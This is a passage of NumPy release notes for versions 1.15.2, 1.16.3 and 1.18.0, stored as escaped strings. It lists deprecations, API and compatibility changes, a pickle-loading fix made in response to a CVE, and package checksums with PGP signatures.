8d2cfb0aef7ec8759736cce26946efa084cdf49797712333539ef7d135e0295e  numpy-1.15.2-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    f4dee74f2626c783a3804df9191e9008946a104d5a284e52427a53ff576423cb  numpy-1.15.2-cp35-cp35m-manylinux1_i686.whl\n    497d7c86df4f85eb03b7f58a7dd0f8b948b1f582e77629341f624ba301b4d204  numpy-1.15.2-cp35-cp35m-manylinux1_x86_64.whl\n    866bf72b9c3bfabe4476d866c70ee1714ad3e2f7b7048bb934892335e7b6b1f7  numpy-1.15.2-cp35-none-win32.whl\n    71bf3b7ca15b1967bba3a1ef6a8e87286382a8b5e46ac76b42a02fe787c5237d  numpy-1.15.2-cp35-none-win_amd64.whl\n    4e28e66cf80c09a628ae680efeb0aa9a066eb4bb7db2a5669024c5b034891576  numpy-1.15.2-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    8aeac8b08f4b8c52129518efcd93706bb6d506ccd17830b67d18d0227cf32d9e  numpy-1.15.2-cp36-cp36m-manylinux1_i686.whl\n    a251570bb3cb04f1627f23c234ad09af0e54fc8194e026cf46178f2e5748d647  numpy-1.15.2-cp36-cp36m-manylinux1_x86_64.whl\n    5b4dfb6551eaeaf532054e2c6ef4b19c449c2e3a709ebdde6392acb1372ecabc  numpy-1.15.2-cp36-none-win32.whl\n    981daff58fa3985a26daa4faa2b726c4e7a1d45178100125c0e1fdaf2ac64978  numpy-1.15.2-cp36-none-win_amd64.whl\n    dca261e85fe0d34b2c242ecb31c9ab693509af2cf955d9caf01ee3ef3669abd0  numpy-1.15.2-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ffab5b80bba8c86251291b8ce2e6c99a61446459d4c6637f5d5cc8c9ce37c972  numpy-1.15.2-cp37-cp37m-manylinux1_i686.whl\n    58be95faf0ca2d886b5b337e7cba2923e3ad1224b806a91223ea39f1e0c77d03  numpy-1.15.2-cp37-cp37m-manylinux1_x86_64.whl\n    3fde172e28c899580d32dc21cb6d4a1225d62362f61050b654545c662eac215a  numpy-1.15.2-cp37-none-win32.whl\n    cf4b970042ce148ad8dce4369c02a4078b382dadf20067ce2629c239d76460d1  numpy-1.15.2-cp37-none-win_amd64.whl\n    6a1e96568332fd8974b355a422b397288e214746715a7fa6abc10b34d06bad76  numpy-1.15.2.tar.gz\n    27a0d018f608a3fe34ac5e2b876f4c23c47e38295c47dd0775cc294cd2614bc1  numpy-1.15.2.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJbp4ERAAoJEGefIoN3xSR7Jb0IAL7st+3f+hecAU676Dz8E0VZ\nNsO+8wHnt+U4ArJbDPVbXX6/yzpGd1lp2QrL99EOrYuSFJ7f+xr77BJGj9AA8XfY\nl+C7WyiXRbdtNXjNOfEG6QIPzVIWJY7YUiVBHIcQjb2I2rf5HCzdNak+Yhx4TnoJ\n7HRk7Sr56rnJnRNJN5EQ1NSjYLPMVYpdYn7TNJ8bcUM0KLxtRpcpmb3P++oigy+7\nMv3/HuxuZc9XRwqguwi1sH+fjmm8JuAMvhDXfuWx4HsIh/cOpP62OCvakUZfA5ns\npxewyUoQ1xGr0kJGYGEt3dyjIv2apTQ8g3g4GI8DOPQ5G4DgBdxWJ45yiFLXK1w=\n=a7jm\n-----END PGP SIGNATURE-----\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.16.3": "==========================\n\nThe NumPy 1.16.3 release fixes bugs reported against the 1.16.2 release, and\nalso backports several enhancements from master that seem appropriate for a\nrelease series that is the last to support Python 2.7. The wheels on PyPI are\nlinked with OpenBLAS v0.3.4+,  which should fix the known threading issues\nfound in previous OpenBLAS versions.\n\nDownstream developers building this release should use Cython >= 0.29.2 and,\nif using OpenBLAS, OpenBLAS > v0.3.4.\n\nThe most noticeable change in this release is that unpickling object arrays\nwhen loading ``*.npy`` or ``*.npz`` files now requires an explicit opt-in.\nThis backwards incompatible change was made in response to\n`CVE-2019-6446 <https://nvd.nist.gov/vuln/detail/CVE-2019-6446>`_.\n\n\nCompatibility notes\n===================\n\nUnpickling while loading requires explicit opt-in\n- -------------------------------------------------\nThe functions ``np.load``, and ``np.lib.format.read_array`` take an\n`allow_pickle` keyword which now defaults to ``False`` in response to\n`CVE-2019-6446 <https://nvd.nist.gov/vuln/detail/CVE-2019-6446>`_.\n\n\nImprovements\n============\n\nCovariance in `random.mvnormal` cast to double\n- ----------------------------------------------\nThis should make the tolerance used when checking the singular values of the\ncovariance matrix more meaningful.\n\n\nChanges\n=======\n\n``__array_interface__`` offset now works as documented\n- ------------------------------------------------------\nThe interface may use an ``offset`` value that was previously mistakenly\nignored.\n\n\nChecksums\n=========\n\nMD5\n- ---\n\n    7039dd60e2066e8882149a8b8bd6cf2f  numpy-1.16.3-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    c03c7365b58deefd03e3c080660d7157  numpy-1.16.3-cp27-cp27m-manylinux1_i686.whl\n    91900b9172e39c039326c56cf0149e15  numpy-1.16.3-cp27-cp27m-manylinux1_x86_64.whl\n    b06d87509a2228c5952096cb11c8b007  numpy-1.16.3-cp27-cp27m-win32.whl\n    88c1e91c6bd3626278b7938f12cafbe2  numpy-1.16.3-cp27-cp27m-win_amd64.whl\n    98fb024d8d63f056ef7c82e772c4bfa0  numpy-1.16.3-cp27-cp27mu-manylinux1_i686.whl\n    d2b8da12f0855765e9cd3cc49d9885b9  numpy-1.16.3-cp27-cp27mu-manylinux1_x86_64.whl\n    ec4f2fd2180fd68647f38a0d4c331dcf  numpy-1.16.3-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    7add5c07a1679bfc086d5575be26ccc6  numpy-1.16.3-cp35-cp35m-manylinux1_i686.whl\n    bd3c27deac470bce5edf6936d08966b8  numpy-1.16.3-cp35-cp35m-manylinux1_x86_64.whl\n    c6ab529b105181fc846a8245e5e4d048  numpy-1.16.3-cp35-cp35m-win32.whl\n    1854757b3e127614ae01b0b814762f5c  numpy-1.16.3-cp35-cp35m-win_amd64.whl\n    b23b0727562be62ffd943c7828822da9  numpy-1.16.3-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    93a2a4b48f160ffd1bdd30023b842be2  numpy-1.16.3-cp36-cp36m-manylinux1_i686.whl\n    453f5996ac600c4085656e82005fb0e5  numpy-1.16.3-cp36-cp36m-manylinux1_x86_64.whl\n    773f9e76235ab5edd9ef1c083e62ea9f  numpy-1.16.3-cp36-cp36m-win32.whl\n    9ba2467b05eb4471817509cabff1b9a6  numpy-1.16.3-cp36-cp36m-win_amd64.whl\n    00594b150e69d1776164ffa60d7fdc01  numpy-1.16.3-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    fe3421cbae83004e7feca4d90043e9df  numpy-1.16.3-cp37-cp37m-manylinux1_i686.whl\n    4e907ac7d841018c0a9130ca45d099ee  numpy-1.16.3-cp37-cp37m-manylinux1_x86_64.whl\n    c7e8e9f9ded13b1356e72cd8506df224  numpy-1.16.3-cp37-cp37m-win32.whl\n    370ec58a5fdfe9e7ffe90857577806c6  numpy-1.16.3-cp37-cp37m-win_amd64.whl\n    0886e5b5017f08f2b7a624c0b5931e61  numpy-1.16.3.tar.gz\n    cab84884fba39fbd352550896bf22bfd  numpy-1.16.3.zip\n\nSHA256\n- ------\n\n    b78a1defedb0e8f6ae1eb55fa6ac74ab42acc4569c3a2eacc2a407ee5d42ebcb  numpy-1.16.3-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    0e2eed77804b2a6a88741f8fcac02c5499bba3953ec9c71e8b217fad4912c56c  numpy-1.16.3-cp27-cp27m-manylinux1_i686.whl\n    754a6be26d938e6ca91942804eb209307b73f806a1721176278a6038869a1686  numpy-1.16.3-cp27-cp27m-manylinux1_x86_64.whl\n    315fa1b1dfc16ae0f03f8fd1c55f23fd15368710f641d570236f3d78af55e340  numpy-1.16.3-cp27-cp27m-win32.whl\n    80d99399c97f646e873dd8ce87c38cfdbb668956bbc39bc1e6cac4b515bba2a0  numpy-1.16.3-cp27-cp27m-win_amd64.whl\n    a61255a765b3ac73ee4b110b28fccfbf758c985677f526c2b4b39c48cc4b509d  numpy-1.16.3-cp27-cp27mu-manylinux1_i686.whl\n    88a72c1e45a0ae24d1f249a529d9f71fe82e6fa6a3fd61414b829396ec585900  numpy-1.16.3-cp27-cp27mu-manylinux1_x86_64.whl\n    54fe3b7ed9e7eb928bbc4318f954d133851865f062fa4bbb02ef8940bc67b5d2  numpy-1.16.3-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    abbd6b1c2ef6199f4b7ca9f818eb6b31f17b73a6110aadc4e4298c3f00fab24e  numpy-1.16.3-cp35-cp35m-manylinux1_i686.whl\n    771147e654e8b95eea1293174a94f34e2e77d5729ad44aefb62fbf8a79747a15  numpy-1.16.3-cp35-cp35m-manylinux1_x86_64.whl\n    48241759b99d60aba63b0e590332c600fc4b46ad597c9b0a53f350b871ef0634  numpy-1.16.3-cp35-cp35m-win32.whl\n    b16d88da290334e33ea992c56492326ea3b06233a00a1855414360b77ca72f26  numpy-1.16.3-cp35-cp35m-win_amd64.whl\n    ab4896a8c910b9a04c0142871d8800c76c8a2e5ff44763513e1dd9d9631ce897  numpy-1.16.3-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    7fde5c2a3a682a9e101e61d97696687ebdba47637611378b4127fe7e47fdf2bf  numpy-1.16.3-cp36-cp36m-manylinux1_i686.whl\n    4b4f2924b36d857cf302aec369caac61e43500c17eeef0d7baacad1084c0ee84  numpy-1.16.3-cp36-cp36m-manylinux1_x86_64.whl\n    d160e57731fcdec2beda807ebcabf39823c47e9409485b5a3a1db3a8c6ce763e  numpy-1.16.3-cp36-cp36m-win32.whl\n    1f46532afa7b2903bfb1b79becca2954c0a04389d19e03dc73f06b039048ac40  numpy-1.16.3-cp36-cp36m-win_amd64.whl\n    1c666f04553ef70fda54adf097dbae7080645435fc273e2397f26bbf1d127bbb  numpy-1.16.3-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    3d5fcea4f5ed40c3280791d54da3ad2ecf896f4c87c877b113576b8280c59441  numpy-1.16.3-cp37-cp37m-manylinux1_i686.whl\n    5a8f021c70e6206c317974c93eaaf9bc2b56295b6b1cacccf88846e44a1f33fc  numpy-1.16.3-cp37-cp37m-manylinux1_x86_64.whl\n    cfef82c43b8b29ca436560d51b2251d5117818a8d1fb74a8384a83c096745dad  numpy-1.16.3-cp37-cp37m-win32.whl\n    a4f4460877a16ac73302a9c077ca545498d9fe64e6a81398d8e1a67e4695e3df  numpy-1.16.3-cp37-cp37m-win_amd64.whl\n    adf063a3f87ab89393f5eea0eb903293b112fa0a308e8c594a75ffa585d81d4f  numpy-1.16.3.tar.gz\n    78a6f89da87eeb48014ec652a65c4ffde370c036d780a995edaeb121d3625621  numpy-1.16.3.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEcBAEBAgAGBQJcvRClAAoJEGefIoN3xSR7w5IIALs073ZWOfrVxEuDbO9GMdOk\nGK4zOqNRP+9mEE6Hx13Zbm94G0dNDNaiyNSjU78gRyrJkGZtJ01t/Fj0qLFC4FXp\nAEUh0dHtBH14ODA4RbGkptsoXVWiZdlOTkr+DV83vF9rNvtrLY9GewiN614OTmHV\nkHxLDHzOhLhi80IpBHG7romxlTiESUuEoqEg/HOgUU0bamCtdwQIpCGlggod0TxH\nk1w1oAymtrjBLKJFoLvMKNMBvptIYixNYnHAeWUMrmsO6jOrDW6GnQeZ1FI5iUdx\nGBxEujFydyW0W/X/wNaYkLO0l2pvs6nBUHfXIxxOhjIoxbtYJin5f2EVcfCa77o=\n=ikDD\n-----END PGP SIGNATURE-----\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n.. currentmodule:: numpy\n\n================================\nNumPy NumPy 1.18.0 Release Notes\n================================\n\nIn addition to the usual bug fixes, this NumPy release cleans up and documents\nthe new random C-API, expires a large number of old deprecations, and improves\nthe appearance of the documentation. The Python versions supported are 3.5-3.8.\nThis is the last NumPy release series that will support Python 3.5.\n\nDownstream developers should use Cython >= 0.29.13 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid problems on the Skylake\narchitecture.\n\n\nHighlights\n==========\n\n* The C-API for ``numpy.random`` has been defined and documented.\n* Basic infrastructure for linking with 64 bit BLAS and LAPACK libraries.\n* Many documentation improvements.\n\n\nNew functions\n=============\n\nMultivariate hypergeometric distribution added to ``numpy.random``\n- ------------------------------------------------------------------\nThe method ``multivariate_hypergeometric`` has been added to the class\n`numpy.random.Generator`.  This method generates random variates from\nthe multivariate hypergeometric probability distribution.\n(`gh-13794 <https://github.com/numpy/numpy/pull/13794>`__)\n\n\nDeprecations\n============\n\n``np.fromfile`` and ``np.fromstring`` will error on bad data\n- ------------------------------------------------------------\n\nIn future numpy releases, the functions ``np.fromfile`` and ``np.fromstring``\nwill throw an error when parsing bad data.\nThis will now give a ``DeprecationWarning`` where previously partial or\neven invalid data was silently returned. This deprecation also affects\nthe C defined functions ``PyArray_FromString`` and ``PyArray_FromFile``\n(`gh-13605 <https://github.com/numpy/numpy/pull/13605>`__)\n\nDeprecate non-scalar arrays as fill values in ``ma.fill_value``\n- ---------------------------------------------------------------\nSetting a ``MaskedArray.fill_value`` to a non-scalar array is deprecated\nsince the logic to broadcast the fill value to the array is fragile,\nespecially when slicing.\n(`gh-13698 <https://github.com/numpy/numpy/pull/13698>`__)\n\nDeprecate ``PyArray_As1D``, ``PyArray_As2D``\n- --------------------------------------------\n``PyArray_As1D``, ``PyArray_As2D`` are deprecated, use\n``PyArray_AsCArray`` instead\n(`gh-14036 <https://github.com/numpy/numpy/pull/14036>`__)\n\nDeprecate ``np.alen``\n- ---------------------\n``np.alen`` was deprecated. Use ``len`` instead.\n(`gh-14181 <https://github.com/numpy/numpy/pull/14181>`__)\n\nDeprecate the financial functions\n- ---------------------------------\nIn accordance with\n`NEP-32 <https://numpy.org/neps/nep-0032-remove-financial-functions.html>`_,\nthe financial functions ``fv`` ``ipmt``, ``irr``, ``mirr``, ``nper``,\n``npv``, ``pmt``, ``ppmt``, ``pv`` and ``rate`` are deprecated, and will be\nremoved from NumPy 1.20.The replacement for these functions is the Python package\n`numpy-financial <https://pypi.org/project/numpy-financial>`_.\n(`gh-14720 <https://github.com/numpy/numpy/pull/14720>`__)\n\nThe ``axis`` argument to ``numpy.ma.mask_cols`` and ``numpy.ma.mask_row`` is deprecated\n- ---------------------------------------------------------------------------------------\nThis argument was always ignored.\n(`gh-14996 <https://github.com/numpy/numpy/pull/14996>`__)\n\n\nExpired deprecations\n====================\n\n* ``PyArray_As1D`` and ``PyArray_As2D`` have been removed in favor of\n  ``PyArray_AsCArray``\n  (`gh-14036 <https://github.com/numpy/numpy/pull/14036>`__)\n\n* ``np.rank`` has been removed. This was deprecated in NumPy 1.10\n  and has been replaced by ``np.ndim``.\n  (`gh-14039 <https://github.com/numpy/numpy/pull/14039>`__)\n\n* The deprecation of ``expand_dims`` out-of-range axes in 1.13.0 has\n  expired.\n  (`gh-14051 <https://github.com/numpy/numpy/pull/14051>`__)\n\n* ``PyArray_FromDimsAndDataAndDescr`` and ``PyArray_FromDims`` have been\n  removed (they will always raise an error). Use ``PyArray_NewFromDescr``\n  and ``PyArray_SimpleNew`` instead.\n  (`gh-14100 <https://github.com/numpy/numpy/pull/14100>`__)\n\n* ``numeric.loads``, ``numeric.load``, ``np.ma.dump``,\n  ``np.ma.dumps``, ``np.ma.load``, ``np.ma.loads`` are removed,\n  use ``pickle`` methods instead\n  (`gh-14256 <https://github.com/numpy/numpy/pull/14256>`__)\n\n* ``arrayprint.FloatFormat``, ``arrayprint.LongFloatFormat`` has been removed,\n  use ``FloatingFormat`` instead\n\n* ``arrayprint.ComplexFormat``, ``arrayprint.LongComplexFormat`` has been\n  removed, use ``ComplexFloatingFormat`` instead\n\n* ``arrayprint.StructureFormat`` has been removed, use ``StructureVoidFormat``\n  instead\n  (`gh-14259 <https://github.com/numpy/numpy/pull/14259>`__)\n\n* ``np.testing.rand`` has been removed. This was deprecated in NumPy 1.11\n  and has been replaced by ``np.random.rand``.\n  (`gh-14325 <https://github.com/numpy/numpy/pull/14325>`__)\n\n* Class ``SafeEval`` in ``numpy/lib/utils.py`` has been removed.\n  This was deprecated in NumPy 1.10. Use ``np.safe_eval`` instead.\n  (`gh-14335 <https://github.com/numpy/numpy/pull/14335>`__)\n\n* Remove deprecated support for boolean and empty condition lists in\n  ``np.select``\n  (`gh-14583 <https://github.com/numpy/numpy/pull/14583>`__)\n\n* Array order only accepts 'C', 'F', 'A', and 'K'. More permissive options\n  were deprecated in NumPy 1.11.\n  (`gh-14596 <https://github.com/numpy/numpy/pull/14596>`__)\n\n* np.linspace parameter ``num`` must be an integer. Deprecated in NumPy 1.12.\n  (`gh-14620 <https://github.com/numpy/numpy/pull/14620>`__)\n\n* UFuncs with multiple outputs must use a tuple for the ``out`` kwarg. This\n  finishes a deprecation started in NumPy 1.10.\n  (`gh-14682 <https://github.com/numpy/numpy/pull/14682>`__)\n\nThe files ``numpy/testing/decorators.py``, ``numpy/testing/noseclasses.py``\nand ``numpy/testing/nosetester.py`` have been removed.  They were never\nmeant to be public (all relevant objects are present in the\n``numpy.testing`` namespace), and importing them has given a deprecation\nwarning since NumPy 1.15.0\n(`gh-14567 <https://github.com/numpy/numpy/pull/14567>`__)\n\n\nCompatibility notes\n===================\n\n`numpy.lib.recfunctions.drop_fields` can no longer return None\n- --------------------------------------------------------------\nIf ``drop_fields`` is used to drop all fields, previously the array would\nbe completely discarded and None returned. Now it returns an array of the\nsame shape as the input, but with no fields. The old behavior can be retained\nwith::\n\n    dropped_arr = drop_fields(arr, ['a', 'b'])\n    if dropped_arr.dtype.names == ():\n        dropped_arr = None\n\nconverting the empty recarray to None\n(`gh-14510 <https://github.com/numpy/numpy/pull/14510>`__)\n\n``numpy.argmin/argmax/min/max`` returns ``NaT`` if it exists in array\n- ---------------------------------------------------------------------\n``numpy.argmin``, ``numpy.argmax``, ``numpy.min``, and ``numpy.max`` will return\n``NaT`` if it exists in the array.\n(`gh-14717 <https://github.com/numpy/numpy/pull/14717>`__)\n\n``np.can_cast(np.uint64, np.timedelta64, casting='safe')`` is now ``False``\n- ---------------------------------------------------------------------------\nPreviously this was ``True`` - however, this was inconsistent with ``uint64``\nnot being safely castable to ``int64``, and resulting in strange type\nresolution.\n\nIf this impacts your code, cast ``uint64`` to ``int64`` first.\n(`gh-14718 <https://github.com/numpy/numpy/pull/14718>`__)\n\nChanged random variate stream from ``numpy.random.Generator.integers``\n- ----------------------------------------------------------------------\nThere was a bug in ``numpy.random.Generator.integers`` that caused biased\nsampling of 8 and 16 bit integer types. Fixing that bug has changed the\noutput stream from what it was in previous releases.\n(`gh-14777 <https://github.com/numpy/numpy/pull/14777>`__)\n\nAdd more ufunc loops for ``datetime64``, ``timedelta64``\n- --------------------------------------------------------\n``np.datetime('NaT')`` should behave more like ``float('Nan')``. Add needed\ninfrastructure so ``np.isinf(a)`` and ``np.isnan(a)`` will run on\n``datetime64`` and ``timedelta64`` dtypes. Also added specific loops for\n``numpy.fmin`` and ``numpy.fmax`` that mask ``NaT``. This may require\nadjustment to user- facing code. Specifically, code that either disallowed the\ncalls to ``numpy.isinf`` or ``numpy.isnan`` or checked that they raised an\nexception will require adaptation, and code that mistakenly called\n``numpy.fmax`` and ``numpy.fmin`` instead of ``numpy.maximum`` or\n``numpy.minimum`` respectively will requre adjustment. This also affects\n``numpy.nanmax`` and ``numpy.nanmin``.\n(`gh-14841 <https://github.com/numpy/numpy/pull/14841>`__)\n\n\nC API changes\n=============\n\n``PyDataType_ISUNSIZED(descr)`` now returns False for structured datatypes\n- --------------------------------------------------------------------------\nPreviously this returned True for any datatype of itemsize 0, but now this\nreturns false for the non-flexible datatype with itemsize 0, ``np.dtype([])``.\n(`gh-14393 <https://github.com/numpy/numpy/pull/14393>`__)\n\n\nNew Features\n============\n\nAdd our own ``*.pxd`` cython import file\n- ----------------------------------------\nAdded a ``numpy/__init__.pxd`` file. It will be used for ``cimport numpy``\n(`gh-12284 <https://github.com/numpy/numpy/pull/12284>`__)\n\nA tuple of axes can now be input to ``expand_dims``\n- ---------------------------------------------------\nThe ``numpy.expand_dims`` ``axis`` keyword can now accept a tuple of\naxes.  Previously, ``axis`` was required to be an integer.\n(`gh-14051 <https://github.com/numpy/numpy/pull/14051>`__)\n\nSupport for 64-bit OpenBLAS\n- ---------------------------\nAdded support for 64-bit (ILP64) OpenBLAS. See ``site.cfg.example``\nfor details.\n(`gh-15012 <https://github.com/numpy/numpy/pull/15012>`__)\n\nAdd ``--f2cmap`` option to F2PY\n- -------------------------------\nAllow specifying a file to load Fortran-to-C type map\ncustomizations from.\n(`gh-15113 <https://github.com/numpy/numpy/pull/15113>`__)\n\n\nImprovements\n============\n\nDifferent C numeric types of the same size have unique names\n- ------------------------------------------------------------\nOn any given platform, two of ``np.intc``, ``np.int_``, and ``np.longlong``\nwould previously appear indistinguishable through their ``repr``, despite\ntheir corresponding ``dtype`` having different properties.\nA similar problem existed for the unsigned counterparts to these types, and on\nsome platforms for ``np.double`` and ``np.longdouble``\n\nThese types now always print with a unique ``__name__``.\n(`gh-10151 <https://github.com/numpy/numpy/pull/10151>`__)\n\n``argwhere`` now produces a consistent result on 0d arrays\n- ----------------------------------------------------------\nOn N-d arrays, ``numpy.argwhere`` now always produces an array of shape\n``(n_non_zero, arr.ndim)``, even when ``arr.ndim == 0``. Previously, the\nlast axis would have a dimension of 1 in this case.\n(`gh-13610 <https://github.com/numpy/numpy/pull/13610>`__)\n\nAdd ``axis`` argument for ``random.permutation`` and ``random.shuffle``\n- -----------------------------------------------------------------------\n\nPreviously the ``random.permutation`` and ``random.shuffle`` functions\ncan only shuffle an array along the first axis; they now have a\nnew argument ``axis`` which allows shuffle along a specified axis.\n(`gh-13829 <https://github.com/numpy/numpy/pull/13829>`__)\n\n``method`` keyword argument for ``np.random.multivariate_normal``\n- -----------------------------------------------------------------\nA ``method`` keyword argument is now available for\n``np.random.multivariate_normal`` with possible values\n``{'svd', 'eigh', 'cholesky'}``. To use it, write\n``np.random.multivariate_normal(..., method=<method>)``.\n(`gh-14197 <https://github.com/numpy/numpy/pull/14197>`__)\n\nAdd complex number support for ``numpy.fromstring``\n- ---------------------------------------------------\nNow ``numpy.fromstring`` can read complex numbers.\n(`gh-14227 <https://github.com/numpy/numpy/pull/14227>`__)\n\n``numpy.unique`` has consistent axes order when ``axis`` is not None\n- --------------------------------------------------------------------\nUsing ``moveaxis`` instead of ``swapaxes`` in ``numpy.unique``, so that the ordering of axes\nexcept the axis in arguments will not be broken.\n(`gh-14255 <https://github.com/numpy/numpy/pull/14255>`__)\n\n``numpy.matmul`` with boolean output now converts to boolean values\n- -------------------------------------------------------------------\nCalling ``numpy.matmul`` where the output is a boolean array would fill the array\nwith uint8 equivalents of the result, rather than 0/1. Now it forces the output\nto 0 or 1 (``NPY_TRUE`` or ``NPY_FALSE``).\n(`gh-14464 <https://github.com/numpy/numpy/pull/14464>`__)\n\n``numpy.random.randint`` produced incorrect value when the range was ``2**32``\n- ------------------------------------------------------------------------------\nThe implementation introduced in 1.17.0 had an incorrect check when\ndetermining whether to use the 32-bit path or the full 64-bit\npath that incorrectly redirected random integer generation with a high - low\nrange of ``2**32`` to the 64-bit generator.\n(`gh-14501 <https://github.com/numpy/numpy/pull/14501>`__)\n\nAdd complex number support for ``numpy.fromfile``\n- -------------------------------------------------\nNow ``numpy.fromfile`` can read complex numbers.\n(`gh-14730 <https://github.com/numpy/numpy/pull/14730>`__)\n\n``std=c99`` added if compiler is named ``gcc``\n- ----------------------------------------------\nGCC before version 5 requires the ``-std=c99`` command line argument. Newer\ncompilers automatically turn on C99 mode. The compiler setup code will\nautomatically add the code if the compiler name has ``gcc`` in it.\n(`gh-14771 <https://github.com/numpy/numpy/pull/14771>`__)\n\n\nChanges\n=======\n\n\n``NaT`` now sorts to the end of arrays\n- --------------------------------------\n``NaT`` is now effectively treated as the largest integer for sorting\npurposes, so that it sorts to the end of arrays. This change is for consistency\nwith ``NaN`` sorting behavior.\n(`gh-12658 <https://github.com/numpy/numpy/pull/12658>`__)\n(`gh-15068 <https://github.com/numpy/numpy/pull/15068>`__)\n\nIncorrect ``threshold`` in ``np.set_printoptions`` raises ``TypeError`` or ``ValueError``\n- -----------------------------------------------------------------------------------------\nPreviously an incorrect ``threshold`` raised ``ValueError``; it now raises ``TypeError``\nfor non-numeric types and ``ValueError`` for ``nan`` values.\n(`gh-13899 <https://github.com/numpy/numpy/pull/13899>`__)\n\nWarn when saving a dtype with metadata\n- --------------------------------------\nA ``UserWarning`` will be emitted when saving an array via ``numpy.save`` with\n``metadata``. Saving such an array may not preserve metadata, and if metadata\nis preserved, loading it will cause a ``ValueError``. This shortcoming in save\nand load will be addressed in a future release.\n(`gh-14142 <https://github.com/numpy/numpy/pull/14142>`__)\n\n``numpy.distutils`` append behavior changed for LDFLAGS and similar\n- -------------------------------------------------------------------\n`numpy.distutils` has always overridden rather than appended to ``LDFLAGS`` and\nother similar such environment variables for compiling Fortran extensions. Now\nthe default behavior has changed to appending - which is the expected behavior\nin most situations.  To preserve the old (overwriting) behavior, set the\n``NPY_DISTUTILS_APPEND_FLAGS`` environment variable to 0.  This applies to:\n``LDFLAGS``, ``F77FLAGS``, ``F90FLAGS``, ``FREEFLAGS``, ``FOPT``, ``FDEBUG``,\nand ``FFLAGS``. NumPy 1.16 and 1.17 gave build warnings in situations where this\nchange in behavior would have affected the compile flags used.\n(`gh-14248 <https://github.com/numpy/numpy/pull/14248>`__)\n\nRemove ``numpy.random.entropy`` without a deprecation\n- -----------------------------------------------------\n\n``numpy.random.entropy`` was added to the ``numpy.random`` namespace in 1.17.0.\nIt was meant to be a private c-extension module, but was exposed as public.\nIt has been replaced by ``numpy.random.SeedSequence`` so the module was\ncompletely removed.\n(`gh-14498 <https://github.com/numpy/numpy/pull/14498>`__)\n\nAdd options to quiet build configuration and build with ``-Werror``\n- -------------------------------------------------------------------\nAdded two new configuration options. During the ``build_src`` subcommand, as\npart of configuring NumPy, the files ``_numpyconfig.h`` and ``config.h`` are\ncreated by probing support for various runtime functions and routines.\nPreviously, the very verbose compiler output during this stage clouded more\nimportant information. By default the output is silenced. Running ``runtests.py\n- --debug-info`` will add ``--verbose-cfg`` to the ``build_src`` subcommand,\nwhich will restore the previous behaviour.\n\nAdding ``CFLAGS=-Werror`` to turn warnings into errors would trigger errors\nduring the configuration. Now ``runtests.py --warn-error`` will add\n``--warn-error`` to the ``build`` subcommand, which will percolate to the\n``build_ext`` and ``build_lib`` subcommands. This will add the compiler flag\nto those stages and turn compiler warnings into errors while actually building\nNumPy itself, avoiding the ``build_src`` subcommand compiler calls.\n\n(`gh-14527 <https://github.com/numpy/numpy/pull/14527>`__)\n(`gh-14518 <https://github.com/numpy/numpy/pull/14518>`__)\n\nChecksums\n=========\n\nMD5\n- ---\n\n    40576031bfba1732ee850a1c576ba096  numpy-1.18.0-cp35-cp35m-macosx_10_6_intel.whl\n    99dce76e7845e10585001a6892bb5f63  numpy-1.18.0-cp35-cp35m-manylinux1_i686.whl\n    81e4e422392219e8bc809d9b17c0d0a6  numpy-1.18.0-cp35-cp35m-manylinux1_x86_64.whl\n    785d52acbbbcdd4967acd6f27e341dc6  numpy-1.18.0-cp35-cp35m-win32.whl\n    52ab10e952b72c69f492f30dcc03e561  numpy-1.18.0-cp35-cp35m-win_amd64.whl\n    dc0f8c3b608f17fd1af2ac5dab012683  numpy-1.18.0-cp36-cp36m-macosx_10_9_x86_64.whl\n    990b9567a5f5322ec0115552be9bd169  numpy-1.18.0-cp36-cp36m-manylinux1_i686.whl\n    7cdcb013123ae7b44100ca00a98f8ab3  numpy-1.18.0-cp36-cp36m-manylinux1_x86_64.whl\n    f6b497230df4d8b9a3e80e8e6b896caa  numpy-1.18.0-cp36-cp36m-win32.whl\n    28de3a14f6fcf1391929f1061590b49d  numpy-1.18.0-cp36-cp36m-win_amd64.whl\n    d3279da6815745d977f16383d9b8c0d7  numpy-1.18.0-cp37-cp37m-macosx_10_9_x86_64.whl\n    3eff2e553b4826428790551834f862e9  numpy-1.18.0-cp37-cp37m-manylinux1_i686.whl\n    f0f7b7e58635dea515f6aa5302bdd924  numpy-1.18.0-cp37-cp37m-manylinux1_x86_64.whl\n    df8e307782f55f508405b135211dbeb0  numpy-1.18.0-cp37-cp37m-win32.whl\n    022dd577b0858b146e2d33ed7426cf07  numpy-1.18.0-cp37-cp37m-win_amd64.whl\n    89bbc272a243cdf5c521fea5efe6b853  numpy-1.18.0-cp38-cp38-macosx_10_9_x86_64.whl\n    dc6e094c4c7777ac4040e6f945788f60  